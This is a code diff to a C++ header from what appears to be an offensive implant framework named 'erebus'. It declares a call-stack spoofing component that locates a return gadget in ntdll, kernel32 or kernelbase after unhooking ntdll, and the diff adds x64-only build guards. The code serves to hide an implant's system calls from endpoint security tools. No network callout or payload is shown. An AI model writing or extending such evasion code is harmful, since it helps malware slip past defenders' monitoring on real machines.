@@ -34,6 +34,7 @@ namespace evasion {
 //
 // After Target RET -> Gadget executes `add rsp, 0x68; ret` -> real_return_addr.
 // rax (Target's return value / NTSTATUS) is untouched by the gadget.
+#ifdef _WIN64
 #pragma pack(push, 8)
 struct SpoofContext {
     PVOID     Target;           // +0
@@ -55,22 +56,27 @@ static_assert(offsetof(SpoofContext, Arg4)          ==  40, "SpoofContext layout
 static_assert(offsetof(SpoofContext, StackArgs)     ==  48, "SpoofContext layout");
 static_assert(offsetof(SpoofContext, StackArgCount) == 112, "SpoofContext layout");
 static_assert(sizeof(SpoofContext)                  == 120, "SpoofContext layout");
+#endif // _WIN64
 
 // One-time init. Searches the operator-configured module list
 // (CONFIG_CALLSTACK_SPOOF_MODULES in config.hpp — defaults to
 // ntdll/kernel32/kernelbase) for `add rsp, 0x68; ret`. Call after
 // UnhookNtdll(). Returns FALSE if no gadget found; SpoofCall will forward
 // the call directly (no stack spoofing, but still functional).
+// On x86 always returns FALSE (feature is x64-only).
 BOOL InitCallstackSpoof();
 
 // Returns the cached gadget address (NULL before InitCallstackSpoof succeeds).
+// Always NULL on x86.
 PVOID GetSpoofGadget();
 
-// x64 ASM trampoline (src/evasion/callstack_spoof.asm).
+#ifdef _WIN64
+// x64 ASM trampoline (src/evasion/callstack_spoof_gas.S).
 // Only volatile registers are used; non-volatile register state is fully
 // preserved through the spoofed call.
 // Returns the value Target placed in rax (NTSTATUS for Nt* functions).
 extern "C" ULONG_PTR SpoofCall(SpoofContext* ctx);
+#endif // _WIN64
 
 } // namespace evasion
 } // namespace erebus
